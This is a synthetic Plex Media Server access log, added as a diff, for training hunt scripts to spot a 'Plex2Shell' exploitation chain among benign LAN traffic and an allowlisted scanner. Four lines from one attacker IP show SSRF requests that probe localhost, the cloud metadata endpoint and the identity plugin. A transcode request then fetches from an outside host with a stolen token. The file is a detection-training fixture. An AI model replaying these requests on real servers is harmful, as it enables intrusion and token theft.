@@ -1,0 +1,28 @@
+# Synthetic Plex Media Server access log — Plex2Shell hunt training
+# (CVE-2026-96652 / 96654 / 96655 / 96656)
+# Format: IP - user [time] "METHOD path HTTP/1.1" status bytes [X-Plex-Token: ...]
+# ALL DATA SYNTHETIC. Contains: benign LAN playback, an approved scanner
+# (allowlisted, weekly window 12:00-12:30), background internet noise, and one
+# targeted Plex2Shell exploitation sequence. Your hunt script must find the
+# real chain and NOT flag the benign traffic or the approved scanner.
+192.168.1.50 - - [20/Oct/2026:09:02:11 +0000] "GET /library/sections HTTP/1.1" 200 18422 X-Plex-Token: LANtv9fK2
+192.168.1.50 - - [20/Oct/2026:09:02:14 +0000] "GET /library/metadata/88412 HTTP/1.1" 200 4311 X-Plex-Token: LANtv9fK2
+192.168.1.51 - - [20/Oct/2026:09:05:44 +0000] "GET /:/timeline?ratingKey=88412&key=%2Flibrary%2Fmetadata%2F88412&state=playing&time=45210&duration=5400000 HTTP/1.1" 200 920 X-Plex-Token: PHone7xQ1
+192.168.1.51 - - [20/Oct/2026:09:06:02 +0000] "POST /video/:/transcode/universal/session/sessA9f/start?X-Plex-Token=PHone7xQ1 HTTP/1.1" 200 1140
+203.0.113.99 - - [20/Oct/2026:09:40:03 +0000] "GET / HTTP/1.1" 404 512
+203.0.113.99 - - [20/Oct/2026:09:40:04 +0000] "GET /favicon.ico HTTP/1.1" 404 512
+# --- Plex2Shell exploitation sequence (attacker: reported honeypot IOC) ---
+45.194.92.222 - - [20/Oct/2026:10:15:02 +0000] "GET /player/timeline?protocol=http&address=127.0.0.1&port=32400&commandID=1 HTTP/1.1" 200 1844 X-Plex-Token: junk
+45.194.92.222 - - [20/Oct/2026:10:15:09 +0000] "GET /player/timeline?protocol=http&address=169.254.169.254&port=80&path=%2Flatest%2Fmeta-data%2F HTTP/1.1" 200 2110 X-Plex-Token: junk
+45.194.92.222 - - [20/Oct/2026:10:16:31 +0000] "GET /searchOne?type=8&query=http%3a%2f%2f127.0.0.1%3a32400%2f%3a%2fplugins%2fidentity HTTP/1.1" 200 6930 X-Plex-Token: junk
+45.194.92.222 - - [20/Oct/2026:10:18:44 +0000] "GET /video/:/transcode/universal?protocol=hls&videoResolution=720p&url=http%3a%2f%2f217.60.194.116%2fx.mkv&session=sessBad1 HTTP/1.1" 200 2214 X-Plex-Token: stolen-owner-token
+# --- benign traffic resumes ---
+192.168.1.50 - - [20/Oct/2026:10:31:20 +0000] "GET /:/timeline?ratingKey=88412&key=%2Flibrary%2Fmetadata%2F88412&state=paused&time=91330&duration=5400000 HTTP/1.1" 200 920 X-Plex-Token: LANtv9fK2
+192.168.1.51 - - [20/Oct/2026:10:45:00 +0000] "GET /library/sections/2/all?sort=addedAt%3Adesc HTTP/1.1" 200 55120 X-Plex-Token: PHone7xQ1
+192.168.1.10 - admin [20/Oct/2026:11:02:33 +0000] "GET /server/identity HTTP/1.1" 200 2418 X-Plex-Token: ADMINk4
+192.168.1.10 - admin [20/Oct/2026:11:02:41 +0000] "GET /status/sessions HTTP/1.1" 200 3120 X-Plex-Token: ADMINk4
+# --- approved vuln scanner (allowlisted, weekly window 12:00-12:30) ---
+10.0.5.8 - scanner [20/Oct/2026:12:04:12 +0000] "GET /server/identity HTTP/1.1" 200 2418
+10.0.5.8 - scanner [20/Oct/2026:12:04:15 +0000] "GET /status/sessions HTTP/1.1" 401 210
+10.0.5.8 - scanner [20/Oct/2026:12:04:19 +0000] "GET /:/timeline?ratingKey=1&state=stopped HTTP/1.1" 200 880
+192.168.1.50 - - [20/Oct/2026:13:20:00 +0000] "GET /library/metadata/88501/thumb/1729000000 HTTP/1.1" 200 8841 X-Plex-Token: LANtv9fK2
